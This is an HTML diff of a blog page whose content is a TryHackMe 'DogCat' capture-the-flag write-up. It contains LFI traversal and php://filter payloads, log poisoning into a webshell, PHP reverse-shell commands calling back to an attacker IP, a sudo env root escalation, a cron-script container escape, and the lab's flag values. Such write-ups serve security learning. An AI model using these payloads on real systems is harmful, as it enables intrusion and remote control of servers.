@@ -6,30 +6,31 @@
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <link rel="icon" type="image/png" href="/favicon.png">
   <link rel="stylesheet" type="text/css" href="/css/style.css">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Courier+Prime:wght@700&family=Inconsolata&family=Source+Code+Pro&display=swap" rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.gstatic.com"> 
+  <link
+  href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@500&family=Kanit:wght@600&family=Roboto&family=Electrolize&display=swap&family=Fira+Mono&family=Cousine&display=swapdisplay=swap&family=IBM+Plex+Mono&display=swap&family=Courier+Prime:wght@700&display=swap"
+  rel="stylesheet"> 
+  <link rel="preconnect" href="https://fonts.gstatic.com">
   <script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
-  <!--<script src="/dist/mark.min.js" charset="UTF-8"></script>-->
+  <script src="/dist/mark.min.js" charset="UTF-8"></script>
 <title>TryHackMe - DogCat Writeup &mdash; fmash16's blog</title>
 <meta property="og:title" content="TryHackMe - DogCat Writeup" />
       <meta property="og:description" content="" />
       <meta property="og:type" content="article" />
       <meta property="og:url" content="github" />
-      <meta property="og:image" content="https://fmash16.github.io/img/tryhackme_dogcat/card.png" />
+      <meta property="og:image" content="https://fmash16.github.io//img/tryhackme_dogcat/card.png" />
 
 </head>
 
-<body>
-<!-- <h1 class=blogtitle>./fmash16's blog </h1> -->
-<pre style="font-family:'Courier Prime';color:var(--accent-color);text-align:center;font-weight:1000">
- ___               _   ___   ___ 
-|  _|_____ ___ ___| |_|_  | |  _|
-|  _|     | .'|_ -|   |_| |_| . |
-|_| |_|_|_|__,|___|_|_|_____|___|
-                 u/fmash16's blog</pre>
+<div class=blogtitle><a href="/index.html">fmash16's blog</a></div> 
+<!--<pre style="font-family:'Courier Prime';color:var(--accent-color);text-align:center;font-weight:1000">-->
+ <!--___               _   ___   ___ -->
+<!--|  _|_____ ___ ___| |_|_  | |  _|-->
+<!--|  _|     | .'|_ -|   |_| |_| . |-->
+<!--|_| |_|_|_|__,|___|_|_|_____|___|-->
+                 <!--./fmash16's blog</pre>-->
 <nav>
-   <a href="/index.html">home</a>
+   <!--<a href="/index.html">home</a>-->
    <a href="/archive.html">archive</a>
    <a href="mailto:fmash16@gmail.com">mail</a>
    <a href="https://github.com/fmash16">github</a>
@@ -39,49 +40,64 @@
 </nav>
 
 <article>
-<input id="toggle" type="checkbox" checked>
-<label for="toggle">TOC</label>
-<nav class='toc'>
-    <ul>
-    <li><a href="#tryhackme---dogcat-writeup">TryHackMe - DogCat Writeup</a>
-    <ul>
-    <li><a href="#nmap-scan">## Nmap scan</a></li>
-    <li><a href="#local-file-inclusion">Local File Inclusion</a></li>
-    <li><a href="#user-www-data">User www-data</a></li>
-    <li><a href="#flag1">flag1</a></li>
-    <li><a href="#privilege-escalation---root">## Privilege escalation - Root</a></li>
-    <li><a href="#flag3">flag3</a></li>
-    <li><a href="#getting-out-of-container">## Getting out of container</a></li>
-    <li><a href="#flag4">## flag4</a></li>
-    </ul></li>
-    </ul>
-</nav>
+<ul>
+<li><a href="#tryhackme---dogcat-writeup">TryHackMe - DogCat Writeup</a>
+<ul>
+<li><a href="#nmap-scan">## Nmap scan</a></li>
+<li><a href="#local-file-inclusion">Local File Inclusion</a></li>
+<li><a href="#user-www-data">User www-data</a></li>
+<li><a href="#flag1">flag1</a></li>
+<li><a href="#privilege-escalation---root">## Privilege escalation -
+Root</a></li>
+<li><a href="#flag3">flag3</a></li>
+<li><a href="#getting-out-of-container">## Getting out of
+container</a></li>
+<li><a href="#flag4">## flag4</a></li>
+</ul></li>
+</ul>
 <h1 id="tryhackme---dogcat-writeup">TryHackMe - DogCat Writeup</h1>
 <h2 id="nmap-scan">## Nmap scan</h2>
-<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">-sC</span> <span class="at">-sV</span> <span class="at">-oN</span> nmap.out 10.10.174.171</span></code></pre></div>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">-sC</span> <span class="at">-sV</span> <span class="at">-oN</span> nmap.out 10.10.174.171</span></code></pre></div>
 <p>Open ports: * 22 - SSH * 80- http</p>
-<p>We have a look at the webpage where it lets us view some dot or cat pictures</p>
+<p>We have a look at the webpage where it lets us view some dot or cat
+pictures</p>
 <p><img src="/img/tryhackme_dogcat/1.png" /></p>
-<p>Having a look at the url, we see that the page is running a php that shows the pictures stored in the dogs/ or cats/ folder which passes the value “dog” or “cat” to the variable “view”.</p>
-<p>We try some basic LFI here to chech if we can view the /etc/passwd for example with the req url as:</p>
+<p>Having a look at the url, we see that the page is running a php that
+shows the pictures stored in the dogs/ or cats/ folder which passes the
+value “dog” or “cat” to the variable “view”.</p>
+<p>We try some basic LFI here to chech if we can view the /etc/passwd
+for example with the req url as:</p>
 <pre><code>http://10.10.174.171/?view=../../../../../../../etc/passwd</code></pre>
 <p>But it fails showing that only dogs or cats are allowed.</p>
 <p><img src="/img/tryhackme_dogcat/2.png" /></p>
-<p>So it checks for a string dog or cat in the provided value of view. We try adding “dog” after a null byte %00 so that it passes the string check but is not evaluated when showing the file. We get the following:</p>
+<p>So it checks for a string dog or cat in the provided value of view.
+We try adding “dog” after a null byte %00 so that it passes the string
+check but is not evaluated when showing the file. We get the
+following:</p>
 <p><img src="/img/tryhackme_dogcat/3.png" /></p>
-<p>We see that we do bypass the string check but it fails to open a the file.</p>
-<p>Accidentally passing dogs to the view variable, we find that the script also adds the extension .php to the end of the file to be viewed passed in the view variable</p>
+<p>We see that we do bypass the string check but it fails to open a the
+file.</p>
+<p>Accidentally passing dogs to the view variable, we find that the
+script also adds the extension .php to the end of the file to be viewed
+passed in the view variable</p>
 <p><img src="/img/tryhackme_dogcat/4.png" /></p>
 <h2 id="local-file-inclusion">Local File Inclusion</h2>
-<p>Googling a bit, we find a new php LFI technique found <a href="https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/">here</a>.</p>
-<p>I originally found it in <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion">payloadsallthethings</a> which is a great source for pentesters.</p>
-<p>We use the technique to get our base64 encoded php source of dog.php and decode it to view the source.</p>
+<p>Googling a bit, we find a new php LFI technique found <a
+href="https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/">here</a>.</p>
+<p>I originally found it in <a
+href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion">payloadsallthethings</a>
+which is a great source for pentesters.</p>
+<p>We use the technique to get our base64 encoded php source of dog.php
+and decode it to view the source.</p>
 <pre><code>http://10.10.174.171/?view=php://filter/convert.base64-encode/resource=dog</code></pre>
 <p><img src="/img/tryhackme_dogcat/5.png" /></p>
 <p><img src="/img/tryhackme_dogcat/6.png" /></p>
-<p>Now we see that we can also check the source of the index.php file using directroy traversal in the same way</p>
+<p>Now we see that we can also check the source of the index.php file
+using directroy traversal in the same way</p>
 <pre><code>http://10.10.174.171/?view=php://filter/convert.base64-encode/resource=dog/../index</code></pre>
-<div class="sourceCode" id="cb5"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;!</span><span class="cn">DOCCTYPE</span> <span class="cn">HTML</span><span class="op">&gt;</span></span>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode php"><code class="sourceCode php"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;!</span><span class="cn">DOCCTYPE</span> <span class="cn">HTML</span><span class="op">&gt;</span></span>
 <span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>html<span class="op">&gt;</span></span>
 <span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>head<span class="op">&gt;</span></span>
@@ -116,65 +132,101 @@
 <span id="cb5-33"><a href="#cb5-33" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;/</span>body<span class="op">&gt;</span></span>
 <span id="cb5-34"><a href="#cb5-34" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb5-35"><a href="#cb5-35" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;/</span>html<span class="op">&gt;</span></span></code></pre></div>
-<p>What’s interesting here is that it allows us to pass an “ext” variable that contains the file extension. On the variable being unset, it adds the default extension of .php</p>
-<p>So we check now if we can read the /etc/passwd file with the following request</p>
+<p>What’s interesting here is that it allows us to pass an “ext”
+variable that contains the file extension. On the variable being unset,
+it adds the default extension of .php</p>
+<p>So we check now if we can read the /etc/passwd file with the
+following request</p>
 <pre><code>http://10.10.174.171/?view=dog/../../../../etc/passwd&amp;ext=</code></pre>
 <p>And we see that we can!</p>
 <p><img src="/img/tryhackme_dogcat/7.png" /></p>
-<p>Now we check if we can find the log file where it logs all our requests. After fiddling around for a bit, we find the logs in the /var/log/apache2/access.log finding out that the server is running apache2. And we see our last request there.</p>
+<p>Now we check if we can find the log file where it logs all our
+requests. After fiddling around for a bit, we find the logs in the
+/var/log/apache2/access.log finding out that the server is running
+apache2. And we see our last request there.</p>
 <p><img src="/img/tryhackme_dogcat/8.png" /></p>
-<p>We see that the log also saves our user-agent header, in our case, Mozilla Firefox</p>
-<p>So, we check if we can inject some php code into our user-agent header that will also get executed along with the main php file.</p>
+<p>We see that the log also saves our user-agent header, in our case,
+Mozilla Firefox</p>
+<p>So, we check if we can inject some php code into our user-agent
+header that will also get executed along with the main php file.</p>
 <p>We can do this using burpsuite repeater to test again and again.</p>
 <p>We change the header to hello to test and it works</p>
 <p><img src="/img/tryhackme_dogcat/9.png" /></p>
-<p>Now we test some php commands. First we try the system(“<cmd>”) which is suposed to execute the command on the machine and print us the output</p>
-<div class="sourceCode" id="cb7"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span> <span class="fu">system</span>(<span class="st">&quot;ls&quot;</span>)<span class="kw">?&gt;</span></span></code></pre></div>
-<p>But executing this once, we somehow break the machine and cannot access the log any more <img src="/img/tryhackme_dogcat/10.png" /></p>
-<p>Next we try a webshell like approach that will get a command passed in the cmd variable and execute it.</p>
-<div class="sourceCode" id="cb8"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="fu">system</span>(<span class="va">$_GET</span>[<span class="st">&#39;cmd&#39;</span>])<span class="ot">;</span></span></code></pre></div>
+<p>Now we test some php commands. First we try the system(“<cmd>”) which
+is suposed to execute the command on the machine and print us the
+output</p>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode php"><code class="sourceCode php"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span> <span class="fu">system</span>(<span class="st">&quot;ls&quot;</span>)<span class="kw">?&gt;</span></span></code></pre></div>
+<p>But executing this once, we somehow break the machine and cannot
+access the log any more <img src="/img/tryhackme_dogcat/10.png" /></p>
+<p>Next we try a webshell like approach that will get a command passed
+in the cmd variable and execute it.</p>
+<div class="sourceCode" id="cb8"><pre
+class="sourceCode php"><code class="sourceCode php"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="fu">system</span>(<span class="va">$_GET</span>[<span class="st">&#39;cmd&#39;</span>])<span class="ot">;</span></span></code></pre></div>
 <p><img src="/img/tryhackme_dogcat/11.png" /></p>
 <p>And we have command execution!</p>
 <h2 id="user-www-data">User www-data</h2>
-<p>We try some commands and see that we are www-data, we try getting a reverse shell using php. The php reverse shell:</p>
+<p>We try some commands and see that we are www-data, we try getting a
+reverse shell using php. The php reverse shell:</p>
 <div class="sourceCode" id="cb9"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">php</span> <span class="at">-r</span> <span class="st">&#39;$sock=fsockopen(&quot;10.8.6.75&quot;, 8888);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span></span></code></pre></div>
-<p>We must url encode the revshell passed in the command. The url encoded request stands:</p>
+<p>We must url encode the revshell passed in the command. The url
+encoded request stands:</p>
 <pre><code>10.10.12.161/?view=dog/../../../../var/log/apache2/access.log&amp;ext=&amp;cmd=php -r &#39;$sock=fsockopen(&quot;10.8.6.75&quot;,1337);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre>
 <p>We start a nc listener on port 1337 and get the reverse shell.</p>
 <p><img src="/img/tryhackme_dogcat/12.png" /></p>
 <h2 id="flag1">flag1</h2>
-<p>Right away, we find the flag.php in the current folder. We cat out the contents to get the flag.</p>
+<p>Right away, we find the flag.php in the current folder. We cat out
+the contents to get the flag.</p>
 <p><img src="/img/tryhackme_dogcat/13.png" /></p>
 <p><strong>flag1=“THM{Th1s_1s_N0t_4_Catdog_ab67edfa}”</strong></p>
 <p>##flag2</p>
-<p>After digging around the files for a bit, we find our second flag in the /var/www directory.</p>
+<p>After digging around the files for a bit, we find our second flag in
+the /var/www directory.</p>
 <p><img src="/img/tryhackme_dogcat/14.png" /></p>
 <p><strong>flag2 = THM{LF1_t0_RC3_aec3fb}</strong></p>
 <h2 id="privilege-escalation---root">## Privilege escalation - Root</h2>
-<p>Next, we try to escalate our privilege to root. We try some enumeration and find that our user can execute /usr/bin/env as sudo using the command <code>sudo -l</code></p>
+<p>Next, we try to escalate our privilege to root. We try some
+enumeration and find that our user can execute /usr/bin/env as sudo
+using the command <code>sudo -l</code></p>
 <p><img src="/img/tryhackme_dogcat/15.png" /></p>
-<p>We look for privesc using env in <a href="https://gtfobins.github.io/gtfobins/env/#shell">gtfobins</a></p>
-<p>We find that a simple <code>env /bin/sh</code> gives us the shell. So we try that.</p>
+<p>We look for privesc using env in <a
+href="https://gtfobins.github.io/gtfobins/env/#shell">gtfobins</a></p>
+<p>We find that a simple <code>env /bin/sh</code> gives us the shell. So
+we try that.</p>
 <p><img src="/img/tryhackme_dogcat/16.png" /></p>
 <h2 id="flag3">flag3</h2>
-<p>And, we have escalated to root successfully. lets look for the remaining flags.We find our 3rd flag in the /root directory.</p>
+<p>And, we have escalated to root successfully. lets look for the
+remaining flags.We find our 3rd flag in the /root directory.</p>
 <p><img src="/img/tryhackme_dogcat/17.png" /></p>
 <p><strong>flag3 = “THM{D1ff3r3nt_3nv1ronments_874112}”</strong></p>
 <p>The flag tells us something about a different environment.</p>
-<p>Looking around for a bit, we find a .dockerenv file in the root directory, which tells us that we are running inside a docker container.</p>
+<p>Looking around for a bit, we find a .dockerenv file in the root
+directory, which tells us that we are running inside a docker
+container.</p>
 <p><img src="/img/tryhackme_dogcat/18.png" /></p>
-<p>After some looking around, we find an interesting folder in the /opt/backups directory, having a look at the backup.sh file, we find the following</p>
-<div class="sourceCode" id="cb11"><pre class="sourceCode backup.sh"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="fu">tar</span> cf /root/container/backup/backup.tar /root/container</span></code></pre></div>
+<p>After some looking around, we find an interesting folder in the
+/opt/backups directory, having a look at the backup.sh file, we find the
+following</p>
+<div class="sourceCode" id="cb11"><pre
+class="sourceCode backup.sh"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="fu">tar</span> cf /root/container/backup/backup.tar /root/container</span></code></pre></div>
 <h2 id="getting-out-of-container">## Getting out of container</h2>
-<p>So the script basically backs up the /root/container to the backup.tar file we found. It might be running a cron job. We see that we have write permissions to the file and so, lets try writing a reverse shell into the backup.sh file.</p>
+<p>So the script basically backs up the /root/container to the
+backup.tar file we found. It might be running a cron job. We see that we
+have write permissions to the file and so, lets try writing a reverse
+shell into the backup.sh file.</p>
 <p><img src="/img/tryhackme_dogcat/19.png" /></p>
-<p>We open up a netcat listener on port 8888 and after some time, get a shell back from root.</p>
+<p>We open up a netcat listener on port 8888 and after some time, get a
+shell back from root.</p>
 <p><img src="/img/tryhackme_dogcat/20.png" /></p>
 <h2 id="flag4">## flag4</h2>
-<p>This time, we see that we are on the machine iteself and not inside a docker container. Going into the root home, /root, we fine our flag4:</p>
+<p>This time, we see that we are on the machine iteself and not inside a
+docker container. Going into the root home, /root, we fine our
+flag4:</p>
 <p><img src="/img/tryhackme_dogcat/21.png" /></p>
-<p><strong>flag4 = “THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}”</strong></p>
-<p>New topics learnt: * Chech the logs * docker container, cronjob * New php lfi technique</p>
+<p><strong>flag4 =
+“THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}”</strong></p>
+<p>New topics learnt: * Chech the logs * docker container, cronjob * New
+php lfi technique</p>
 </article>
 
 <footer>
